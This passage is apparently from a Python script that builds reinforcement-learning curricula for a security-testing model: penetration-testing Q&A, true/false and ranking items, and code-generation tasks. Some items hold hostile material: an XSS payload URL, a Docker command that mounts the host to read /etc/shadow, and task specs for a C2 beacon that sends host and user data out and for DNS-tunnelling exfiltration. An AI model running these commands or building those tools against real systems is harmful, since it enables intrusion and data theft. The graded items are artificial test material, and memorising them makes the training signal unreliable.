    ("A login form reflects the username in the response without escaping: 'Welcome back, testuser'. The username field is in the URL. What type of vulnerability exists and how would you exploit it?", "Reflected XSS — craft a URL with malicious script in the username parameter that executes in the victim's browser when they click the link", "This is reflected XSS. The username parameter is reflected without escaping. Exploit: craft URL like target.com/login?username=<script>alert(1)</script> — when victim clicks, script executes in their browser. Can steal cookies, redirect, deface, etc."),
    ("You find a web application with 'X-Powered-By: PHP/7.4.3' and 'Set-Cookie: PHPSESSID=abc'. What does this tell you and what should you investigate?", "The application uses PHP 7.4.3 (which is EOL and has known vulnerabilities) and PHP session cookies. Investigate: PHP version CVEs, session management security, PHP configuration", "PHP 7.4.3 is end-of-life and has known CVEs. The PHPSESSID cookie suggests PHP session management. Investigate: PHP CVEs for 7.4.3, session cookie settings (HttpOnly, Secure, SameSite), PHP configuration (register_globals, allow_url_include, etc.)."),
    ("A network has DMZ (web server), Internal (AD + workstations), and Management (switches + backup) subnets. The DMZ can reach the Internal network. Map the most dangerous attack path.", "DMZ web compromise → AD controller → domain dominance → total network compromise. The AD controller is the critical asset and should never be reachable from DMZ.", "Worst path: DMZ web → Internal → AD controller → domain dominance. AD compromise = total network compromise. The AD should be isolated from DMZ entirely. If DMZ can reach AD, this is a critical design flaw."),
    ("You're testing a search function and the query is reflected: 'No results for <script>alert(1)</script>'. What defenses would stop this and how would you verify they work?", "Output encoding (HTML entities for < and >), Content-Security-Policy (blocks inline scripts), HttpOnly cookies (prevents cookie theft even if XSS works). Verify by: checking if < becomes &lt; in the response, checking for CSP header, testing if alert still fires after defenses.", "Defenses: 1) Output encoding: < → &lt; > → &gt; (prevents script execution). 2) CSP: default-src 'self' blocks inline scripts. 3) HttpOnly cookies: prevents document.cookie access. Verify by checking the actual response for encoded characters and CSP headers."),
    ("You discover 5 open ports: 22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL), 3389 (RDP). In what order should you investigate them and why?", "Order: 80/443 first (web app — most likely entry point), then 3389 (RDP — high-value Windows target), then 22 (SSH — credential-based), then 3306 (should not be exposed — investigate as finding)", "Web app (80/443) is the most accessible and likely entry point. RDP (3389) is a high-value Windows target. SSH (22) is credential-based access. MySQL (3306) should not be internet-facing — its presence is itself a finding."),
    ("A target has Apache 2.4.49, OpenSSH 7.9, MySQL 5.7.34, and Windows Server 2019. Rank these by exploitability and explain your reasoning.", "1. Apache 2.4.49 (critical path traversal CVE, no auth needed), 2. Windows Server 2019 RDP (direct access if creds found), 3. MySQL 5.7.34 (data access + potential file access), 4. OpenSSH 7.9 (credential-based, fewer critical CVEs)", "Apache 2.4.49 is #1 because CVE-2021-41773 is critical, version-specific, and requires no authentication. Windows RDP is #2 because direct access is possible with credentials. MySQL is #3 for data access. SSH is #4 because it requires credentials and has fewer critical CVEs for 7.9."),
    ("What is the most important security mistake in a DMZ-to-internal network architecture and how would you detect it?", "Allowing DMZ to initiate connections to internal network without strict firewall rules — detect by testing DMZ→internal connectivity (ports, protocols, services)", "The critical mistake is allowing unrestricted DMZ→internal traffic. Detect by: from the DMZ, test connectivity to internal hosts (nmap, TCP probes, UDP probes). If internal hosts are reachable, the segmentation is insufficient. Proper design: DMZ can only reach specific internal services on specific ports."),
    ("A web application has 'Content-Security-Policy: default-src 'self'' and 'Set-Cookie: session=abc; HttpOnly; Secure'. How does this affect XSS exploitation?", "CSP blocks inline scripts (prevents <script> tags and event handlers). HttpOnly prevents JavaScript from reading the session cookie. XSS may still work for other attacks (redirect, DOM manipulation, API calls) but cookie theft is prevented.", "CSP with default-src 'self' blocks: inline <script> tags, inline event handlers (onerror, onload), eval(). XSS can still: redirect the page, modify DOM, make fetch/XHR requests (to same origin). But cannot: load external scripts (unless allowed), execute inline scripts, read HttpOnly cookies."),
    ("You find a subdomain dev.target.com that resolves to an internal IP 10.0.2.50. What does this tell you and what should you investigate?", "The dev environment is hosted internally but has a public DNS record — investigate the dev server for vulnerabilities, check if it's actually accessible from internet, look for dev-specific weaknesses (debug modes, default creds, test data)", "A public DNS record pointing to an internal IP suggests the dev server might be accessible via VPN, or the DNS record is stale, or there's a port forward. Investigate: is it reachable? What's running? Debug modes? Default credentials? Test data? API keys? Dev environments often have weaker security."),
    ("Explain why exposing MySQL (port 3306) to the internet is a critical finding and what specific attacks are possible.", "MySQL exposure allows: authentication attacks (brute force, default creds), authentication bypass (CVE-2021-2157), data access/exfiltration, FILE privilege exploitation (read/write server files), potential RCE if combined with other vulnerabilities. MySQL should be restricted to internal networks.", "Attacks: 1) Brute force / default credentials (root with no password is common). 2) CVE-2021-2157 auth bypass. 3) Data access — SELECT * FROM users, credit cards, etc. 4) FILE privilege —LOAD_FILE() to read server files, SELECT ... INTO OUTFILE to write files. 5) If combined with web app: potential for SQL injection → file operations → RCE."),
    ("A target's HTTP response includes 'Server: nginx/1.18.0' and 'X-Powered-By: Express'. What does this tell you about the tech stack and what should you investigate?", "Frontend: nginx 1.18.0 (web server/reverse proxy). Backend: Node.js Express framework. Investigate: nginx CVEs for 1.18.0, Express-specific vulnerabilities, Node.js version, npm dependencies, API endpoints, JavaScript security issues.", "Stack: nginx (reverse proxy) → Node.js/Express (application server). nginx 1.18.0 has known CVEs (CVE-2020-25712, etc.). Express has had vulnerabilities (CVE-2024-29041, etc.). Investigate: nginx config (headers, TLS, proxy settings), Express app (API endpoints, input validation, dependencies), Node.js version."),
    ("You discover port 2375 open on a target. What service is this and why is it critically dangerous?", "Port 2375 is Docker daemon API (unencrypted). It's critically dangerous because it allows full container control: create/start/stop containers, mount host filesystem, execute commands in containers, potential host escape to underlying server.", "Docker daemon on port 2375 (no TLS) allows: 1) `docker -H tcp://target:2375 ps` — list containers. 2) `docker -H tcp://target:2375 run -v /:/host alpine cat /host/etc/shadow` — mount host filesystem and read sensitive files. 3) Run privileged container → host escape. This is one of the most critical exposures — full server compromise possible."),
    ("What information can you gather from SSL/TLS certificate inspection and why is it useful for reconnaissance?", "Certificate reveals: organization name, domain names (CN + SAN), issuance date, expiration, issuer, sometimes internal hostnames. Useful for: identifying all subdomains (from SAN), discovering internal hostnames accidentally exposed, determining certificate management practices.", "SSL cert reconnaissance: 1) CN and SAN fields reveal all domain names covered by the cert — may include dev.target.com, admin.target.com, etc. 2) Organization field reveals company name. 3) Issuance/expiration reveals certificate lifecycle. 4) Sometimes internal hostnames leak in certs (e.g., '*.internal.corp.com'). Tools: nmap --script ssl-cert, openssl s_client."),
    ("A target has a '.env' file accessible at https://target.com/.env. What would you expect to find and why is this dangerous?", "The .env file typically contains: database credentials, API keys, secret keys, JWT secrets, AWS credentials, connection strings. This is extremely dangerous — full application compromise possible with exposed credentials.", "A publicly accessible .env file is a critical finding. Expected contents: DB_HOST, DB_USER, DB_PASSWORD, API_KEY, SECRET_KEY, AWS_ACCESS_KEY_ID, JWT_SECRET, etc. With these: access the database, use API keys, forge JWTs, access cloud resources. This is a major information disclosure vulnerability."),
    ("Explain the difference between a firewall rule that 'allows DMZ to internal on port 80' versus 'allows DMZ to internal on port 80 to destination 10.0.2.20 only'. Which is more secure and why?", "The second is more secure — it's least-privilege. First rule allows DMZ to ANY internal host on port 80. Second rule restricts to a specific host (10.0.2.20) on port 80. Least-privilege limits blast radius if DMZ is compromised.", "Rule 1 (DMZ→internal:80 to ANY): If DMZ compromised, attacker can access ANY internal web server. Rule 2 (DMZ→internal:80 to 10.0.2.20 only): If DMZ compromised, attacker can only reach 10.0.2.20 on port 80. Much more limited. Least-privilege is always more secure — restrict to specific destinations, not entire subnets."),
]

for q, a, explanation in reasoning_qa:
    GRPO_SCENARIOS.append({
        "domain": "Security Reasoning",
        "question": q,
        "ideal_answer": a,
        "explanation": explanation,
        "reward_type": "semantic_similarity",
        "reward_description": f"Answer should include key points: {a}"
    })

# === GRPO: Generation tasks (20 tasks with verifiable output) ===
generation_tasks = [
    {
        "domain": "Code Generation — Security Tool",
        "task": "Write a Python function that scans a string for credit card numbers using Luhn algorithm and regex pattern matching. The function should return True if a valid card number is found, False otherwise. Include docstring, type hints, and handle edge cases.",
        "verification": "Function exists, accepts string, returns bool, uses Luhn check, uses regex for pattern matching, handles edge cases (None, empty string, no card found)",
        "expected_output_keywords": ["def", "luhn", "regex", "bool", "return", "0-9", "credit card"]
    },
    {
        "domain": "Code Generation — Network Tool",
        "task": "Write a Python function that takes an IP address and port number, attempts a TCP connection, and returns whether the port is open. Include proper error handling, timeout, and docstring.",
        "verification": "Function exists, accepts IP+port, returns bool, handles connection timeout, handles connection refused, has docstring",
        "expected_output_keywords": ["def", "socket", "connect", "timeout", "True", "False", "port"]
    },
    {
        "domain": "Code Generation — Data Analysis",
        "task": "Write a Python function that reads a CSV file and returns a dictionary with: total rows, column names, and any rows where the 'status' column equals 'failed'. Include error handling for file not found.",
        "verification": "Function exists, reads CSV, returns dict with total_rows + columns + failed_rows, handles FileNotFoundError",
        "expected_output_keywords": ["def", "csv", "DictReader", "total_rows", "failed", "FileNotFoundError"]
    },
    {
        "domain": "Code Generation — Encryption",
        "task": "Write a Python function that takes a plaintext string and a key, and returns the AES-256-CBC encrypted ciphertext as base64. Include proper IV generation and error handling.",
        "verification": "Function exists, uses AES-256-CBC, generates random IV, returns base64, handles errors",
        "expected_output_keywords": ["AES", "CBC", "base64", "iv", "encrypt", "padding"]
    },
    {
        "domain": "Code Generation — File Operations",
        "task": "Write a Python function that securely deletes a file by overwriting it with random data 3 times before deleting. Include proper error handling and verification that the file is actually deleted.",
        "verification": "Function exists, overwrites file 3 times with random data, then deletes, handles errors, verifies deletion",
        "expected_output_keywords": ["def", "overwrite", "random", "os.remove", "delete", "secure"]
    },
    {
        "domain": "Code Generation — HTTP Client",
        "task": "Write a Python function that takes a URL, makes an HTTP GET request with a custom User-Agent header, and returns the status code, response headers, and response body. Include timeout and error handling.",
        "verification": "Function exists, makes GET request, custom User-Agent, returns status+headers+body, timeout, error handling",
        "expected_output_keywords": ["def", "requests", "get", "User-Agent", "status_code", "timeout"]
    },
    {
        "domain": "Code Generation — Password Strength",
        "task": "Write a Python function that evaluates password strength based on: length (min 12), uppercase letters, lowercase letters, digits, special characters. Return a score from 0-100 and a label (weak/medium/strong/very_strong).",
        "verification": "Function exists, checks 5 criteria, returns score 0-100, returns label, handles edge cases",
        "expected_output_keywords": ["def", "length", "uppercase", "lowercase", "digit", "special", "score"]
    },
    {
        "domain": "Code Generation — Log Parser",
        "task": "Write a Python function that parses an Apache access log line and extracts: IP address, timestamp, HTTP method, URL, status code, response size. Return as a dictionary. Handle malformed lines gracefully.",
        "verification": "Function exists, parses Apache log format, extracts 6 fields, returns dict, handles malformed lines",
        "expected_output_keywords": ["def", "regex", "IP", "timestamp", "method", "status", "size"]
    },
    {
        "domain": "Code Generation — Subdomain Finder",
        "task": "Write a Python function that takes a domain name and a wordlist file, performs DNS lookups for each subdomain, and returns a list of discovered subdomains with their IP addresses. Include rate limiting (max 10 requests per second).",
        "verification": "Function exists, takes domain+wordlist, performs DNS lookups, returns list of (subdomain, ip) tuples, rate limits to 10/sec",
        "expected_output_keywords": ["def", "dnspython", "resolver", "subdomain", "rate", "sleep"]
    },
    {
        "domain": "Code Generation — Hash Cracker",
        "task": "Write a Python function that takes an MD5 hash and a wordlist file, and tries to crack the hash by comparing MD5 hashes of each word. Return the cracked password or None if not found. Include progress reporting.",
        "verification": "Function exists, takes hash+wordlist, computes MD5 of each word, compares, returns password or None, shows progress",
        "expected_output_keywords": ["def", "md5", "hash", "wordlist", "crack", "None"]
    },
    {
        "domain": "Code Generation — Port Scanner",
        "task": "Write a Python function that scans a range of ports on a target IP using multi-threading (max 100 threads). Return a list of open ports. Include timeout and proper socket cleanup.",
        "verification": "Function exists, scans port range, uses threading (100 max), returns open ports list, timeout, socket cleanup",
        "expected_output_keywords": ["def", "threading", "socket", "port", "open", "timeout", "ThreadPool"]
    },
    {
        "domain": "Code Generation — Directory Buster",
        "task": "Write a Python function that takes a base URL and a wordlist, attempts to find existing directories by sending HTTP requests, and returns a list of found paths (HTTP 200/301/302/403). Include concurrency and user-agent rotation.",
        "verification": "Function exists, takes URL+wordlist, checks HTTP responses, returns found paths, uses concurrency, rotates user agents",
        "expected_output_keywords": ["def", "requests", "wordlist", "200", "301", "concurrent", "User-Agent"]
    },
    {
        "domain": "Code Generation — Vulnerability Scanner",
        "task": "Write a Python function that takes a URL and tests for SQL injection by sending a payload and checking if the response differs from the baseline. Return True if SQLi is suspected, False otherwise. Include multiple test payloads.",
        "verification": "Function exists, sends SQLi payloads, compares response to baseline, returns True/False, uses multiple payloads",
        "expected_output_keywords": ["def", "sql", "payload", "baseline", "response", "True", "False"]
    },
    {
        "domain": "Code Generation — Malware Signature Detector",
        "task": "Write a Python function that scans a file for known malware signatures (YARA-like rules). Define 3 sample rules (string patterns) and check if any match. Return list of matched rule names.",
        "verification": "Function exists, defines rules (string patterns), scans file, returns matched rule names, handles file errors",
        "expected_output_keywords": ["def", "rule", "pattern", "match", "signature", "malware"]
    },
    {
        "domain": "Code Generation — C2 Beacon Simulator",
        "task": "Write a Python function that simulates a C2 beacon: sends a periodic HTTP POST request to a callback URL with a JSON payload containing: hostname, username, domain, timestamp. Include configurable interval and jitter.",
        "verification": "Function exists, sends periodic HTTP POST, JSON payload with hostname/username/domain/timestamp, configurable interval+jitter",
        "expected_output_keywords": ["def", "beacon", "POST", "json", "hostname", "interval", "jitter"]
    },
    {
        "domain": "Code Generation — Process Memory Reader",
        "task": "Write a Python function (using ctypes/psutil) that lists all running processes with their PID, name, and command line. Handle access denied errors gracefully. Return list of dictionaries.",
        "verification": "Function exists, lists processes with PID+name+cmdline, handles access denied, returns list of dicts",
        "expected_output_keywords": ["def", "psutil", "pid", "name", "cmdline", "access denied", "process"]
    },
    {
        "domain": "Code Generation — Keylogger Detector",
        "task": "Write a Python function that scans running processes for known keylogger characteristics: hooks on keyboard events, hidden windows, suspicious network connections. Return list of suspicious process names with reasons.",
        "verification": "Function exists, checks for keyboard hooks, hidden windows, suspicious network, returns suspicious processes with reasons",
        "expected_output_keywords": ["def", "keylogger", "keyboard", "hook", "hidden", "network", "suspicious"]
    },
    {
        "domain": "Code Generation — Evidence Collector",
        "task": "Write a Python function that collects forensic evidence from a system: running processes, network connections, recent files (last 24h), login events. Save everything to a timestamped JSON file. Handle permission errors gracefully.",
        "verification": "Function exists, collects 4 types of evidence, saves to timestamped JSON, handles permission errors",
        "expected_output_keywords": ["def", "processes", "network", "files", "login", "JSON", "forensic"]
    },
    {
        "domain": "Code Generation — Exploit Payload Generator",
        "task": "Write a Python function that generates a buffer overflow payload: NOP sled (100 bytes), shellcode placeholder (10 bytes of 0xCC), and return address overwrite (4 bytes). Return the complete payload as bytes. Include configurable offset.",
        "verification": "Function exists, generates NOP sled (100 bytes), shellcode placeholder (0xCC), return address overwrite, returns bytes, configurable offset",
        "expected_output_keywords": ["def", "nop", "shellcode", "0x90", "0xCC", "return", "offset", "payload"]
    },
    {
        "domain": "Code Generation — stealth Communication",
        "task": "Write a Python function that sends data over DNS tunneling: encodes data as base64, splits into chunks, sends each chunk as a DNS TXT query to a controlled DNS server. Include encoding and chunking logic.",
        "verification": "Function exists, encodes data as base64, splits into chunks, sends DNS TXT queries, includes chunking logic",
        "expected_output_keywords": ["def", "dns", "base64", "chunk", "TXT", "encode", "tunnel"]
    },
]

for i, task in enumerate(generation_tasks):
    GRPO_SCENARIOS.append({
        "domain": task["domain"],
        "question": task["task"],
        "ideal_answer": f"<reasoning>\nAnalyze the requirements: {task['task'][:200]}...\nIdentify key components needed.\nPlan the implementation approach.\nConsider edge cases and error handling.\n</reasoning>\n\n<solution>\n[Correct Python implementation that meets all stated requirements]\n</solution>",
        "explanation": f"Verification criteria: {task['verification']}",
        "reward_type": "keyword_match",
        "reward_description": f"Output must contain: {', '.join(task['expected_output_keywords'])}",
        "expected_keywords": task["expected_output_keywords"]
    })

# === GRPO: True/False security questions (20 questions) ===
tf_questions = [
    ("True or False: A DMZ should allow unrestricted access to the internal network.", "False", "A DMZ should be isolated from the internal network with strict firewall rules. Unrestricted access defeats the purpose of the DMZ."),
    ("True or False: The HttpOnly flag on cookies prevents XSS attacks entirely.", "False", "HttpOnly prevents JavaScript from reading the cookie, but XSS can still perform other attacks (redirect, DOM manipulation, API calls). It mitigates cookie theft but doesn't prevent XSS."),
    ("True or False: A port being 'open' means the service is vulnerable.", "False", "Open ports indicate a service is listening, not that it's vulnerable. Vulnerability depends on the service, version, configuration, and authentication."),
    ("True or False: Reflected XSS requires the victim to visit a malicious URL.", "True", "Reflected XSS requires the malicious input to be sent to the server and reflected back. The victim must click a crafted link or submit a crafted form for the XSS to execute."),
    ("True or False: MySQL should be exposed to the internet on port 3306 for remote administration.", "False", "MySQL should never be directly exposed to the internet. Remote administration should use VPN, SSH tunnel, or a bastion host. Direct exposure allows brute force, authentication attacks, and potential data compromise."),
    ("True or False: A WAF can prevent all XSS attacks.", "False", "A WAF can block many XSS attacks but can be bypassed with encoding, obfuscation, or novel vectors. WAF is defense-in-depth, not a complete solution. Proper output encoding is the primary defense."),
    ("True or False: nmap -O performs OS detection by sending specially crafted packets and analyzing responses.", "True", "nmap -O sends TCP, UDP, and ICMP packets with specific characteristics and analyzes responses (TTL, window size, TCP options, ISN patterns) to fingerprint the operating system."),
    ("True or False: Port 2375 exposed to the internet allows full Docker container control and potential host compromise.", "True", "Port 2375 is the Docker daemon API (unencrypted). Exposed, it allows creating containers with host filesystem mounts, executing commands, and potentially escaping to the host. This is a critical exposure."),
    ("True or False: A Content-Security-Policy with 'default-src self' blocks all inline scripts.", "True", "default-src 'self' blocks inline <script> tags, inline event handlers (onerror, onload), and eval(). Scripts can only load from the same origin."),
    ("True or False: SQL injection can be prevented by using parameterized queries (prepared statements).", "True", "Parameterized queries separate SQL code from data, preventing injection. The database treats parameters as data, not as part of the SQL command. This is the primary defense against SQLi."),
    ("True or False: A .env file exposed on a web server is a critical information disclosure.", "True", "The .env file typically contains database credentials, API keys, secrets, and connection strings. Exposure gives attackers credentials and keys for multiple services."),
    ("True or False: OS fingerprinting with nmap -O is 100% accurate.", "False", "nmap -O is not 100% accurate. Firewalls, NAT, VM/container environments, and unusual configurations can cause incorrect results. It's a probabilistic assessment, not a definitive identification."),
    ("True or False: UDP scanning is generally faster than TCP scanning.", "False", "UDP scanning is generally slower because UDP is connectionless — Nmap must send multiple packets and wait for responses (or lack thereof) to determine port state. Many UDP ports show as 'open|filtered' because no response doesn't definitively mean open."),
    ("True or False: CSRF attacks require the victim to be authenticated to the target site.", "True", "CSRF exploits the fact that the victim's browser automatically sends authentication cookies with requests. If the victim isn't authenticated, there's no session to exploit."),
    ("True or False: A NULL scan (nmap -sN) sends TCP packets with no flags set.", "True", "NULL scan sends TCP packets with zero flags. According to TCP specification, such packets should elicit a RST response from closed ports and no response from open ports. Some OSes don't follow the spec correctly, making this useful for fingerprinting."),
    ("True or False: Docker containers are inherently secure and isolated from the host.", "False", "Docker containers share the host kernel. With sufficient privileges (--privileged, mounting /var/run/docker.sock, mounting /), container escape to the host is possible. Containers provide process-level isolation, not full VM-level isolation."),
    ("True or False: The 'Server:' HTTP header should be removed or minimized in production environments.", "True", "The Server header reveals web server software and version, helping attackers identify vulnerabilities. It should be removed or obfuscated in production (e.g., 'Server: webserver' without version)."),
    ("True or False: Blind SQL injection is harder to exploit than error-based SQL injection.", "True", "Blind SQLi requires extracting data through boolean conditions or time delays, character by character, which is slow and laborious. Error-based SQLi can directly extract data from error messages, making it faster and easier."),
    ("True or False: A zone transfer (AXFR) reveals the entire DNS zone for a domain.", "True", "AXFR (full zone transfer) returns all DNS records for a zone: all hosts, subdomains, MX records, NS records, etc. It should be restricted to authorized secondary DNS servers only."),
    ("True or False: Using the same password for SSH and MySQL is acceptable if the password is strong.", "False", "Password reuse is always a bad practice regardless of password strength. If one service is compromised, the attacker gains credentials for all services using that password. Each service should have unique credentials."),
]

for q, a, explanation in tf_questions:
    GRPO_SCENARIOS.append({
        "domain": "Security True/False",
        "question": q,
        "ideal_answer": a,
        "explanation": explanation,
        "reward_type": "exact_match",
        "reward_description": f"Answer must be: {a} (case-insensitive)"
    })

# === GRPO: Ranking questions (10 questions) ===
ranking_questions = [
    ("Rank these services by exploitability (most to least): Apache 2.4.49, OpenSSH 7.9, MySQL 5.7.34, Windows RDP. Explain each ranking.",
     "1. Apache 2.4.49 (critical CVE-2021-41773, no auth needed) > 2. Windows RDP (direct access with creds) > 3. MySQL (data + file access) > 4. OpenSSH 7.9 (credential-based, fewer critical CVEs)",
     "Apache 2.4.49 is most exploitable because CVE-2021-41773 is critical and requires no authentication. RDP is second because direct access is possible. MySQL is third for data access. SSH is least exploitable because it needs credentials and has fewer critical CVEs for 7.9."),
    ("Rank these by severity (most to least critical): exposed .env file, XSS in search function, MySQL on port 3306 internet-facing, Apache 2.4.49 path traversal.",
     "1. Apache 2.4.49 path traversal (RCE/arbitrary file read, no auth) > 2. MySQL exposed (data compromise, authentication attacks) > 3. Exposed .env file (credential theft, multiple services) > 4. XSS in search (requires user interaction, limited scope)",
     "Apache path traversal is most critical — remote code execution / arbitrary file read with no authentication. MySQL exposure is second — potential data breach. Exposed .env is third — credentials but requires access. XSS is fourth — requires victim interaction and has limited scope per instance."),
    ("Rank these defensive measures by effectiveness against XSS (most to least): output encoding, WAF, CSP, HttpOnly cookies, input validation.",
     "1. Output encoding (prevents XSS at the root — proper escaping) > 2. CSP (blocks execution even if XSS exists) > 3. Input validation (reduces attack surface but can be bypassed) > 4. HttpOnly cookies (mitigates cookie theft only) > 5. WAF (can be bypassed, defense-in-depth only)",
     "Output encoding is #1 because it prevents XSS at the source — properly escaped output cannot execute as script. CSP is #2 because it blocks execution even if output isn't escaped. Input validation is #3 — helpful but bypassable. HttpOnly is #4 — very limited scope (cookie theft only). WAF is #5 — bypassable, not a complete solution."),
]

for q, a, explanation in ranking_questions:
    GRPO_SCENARIOS.append({
        "domain": "Security Ranking",
        "question": q,
        "ideal_answer": a,
        "explanation": explanation,
        "reward_type": "semantic_similarity",
        "reward_description": f"Ranking must match: {a}"
    })

# ===========================================================================
# Generate GRPO examples
# ===========================================================================

def generate_grpo():
    """Generate GRPO curriculum entries."""
    output_path = OUTPUT_DIR / "grpo_curriculum.jsonl"
    existing = []
    
    if output_path.exists():
        with open(output_path) as f:
            content = f.read().strip()
            if content:
                existing = [json.loads(line) for line in content.split("\n") if line.strip()]
    
    print(f"Existing GRPO examples: {len(existing)}")
    
    new_examples = []
    for i, scenario in enumerate(GRPO_SCENARIOS):
        entry = {
            "messages": [
                {"role": "system", "content": SYSTEM},
                {"role": "user", "content": f"DOMAIN: {scenario['domain']}\n\n{scenario['question']}"},
                {"role": "assistant", "content": f"<reasoning>\nAnalyze the question: {scenario['question'][:150]}...\nConsider the domain: {scenario['domain']}\nIdentify key concepts and requirements.\nPlan the approach systematically.\n</reasoning>\n\n<solution>\n[{scenario['ideal_answer']}]\n</solution>"}
            ],
            "metadata": {
                "domain": scenario["domain"],
                "question": scenario["question"],
                "ideal_answer": scenario["ideal_answer"],
                "reward_type": scenario.get("reward_type", "semantic_similarity"),
                "reward_description": scenario.get("reward_description", "Answer should match key concepts"),
                "generated": "2026-08-18",
                "type": "grpo"
            }
        }
        new_examples.append(entry)
        print(f"  Generated GRPO #{i+1}: {scenario['domain']} — {scenario['question'][:80]}...")
    
    all_entries = existing + new_examples
    with open(output_path, "w") as f:
        for entry in all_entries:
            f.write(json.dumps(entry) + "\n")
    
    print(f"\nTotal GRPO examples: {len(all_entries)}")
    print(f"Written to: {output_path}")
    return len(all_entries)

# ===========================================================================
# Main
# ===========================================================================

if __name__ == "__main__":
    print("=" * 60)
    print("  CURRICULUM GENERATOR")
    print("  Generating 50+ SFT + 100+ GRPO examples")
    print("=" * 60)
    print()
    
    sft_count = generate_sft()
    print()
    grpo_count = generate_grpo()
    print()
    print("=" * 60)
    print(f"  DONE: {sft_count} SFT + {grpo_count} GRPO = {sft_count + grpo_count} total")
    print("=" * 60)
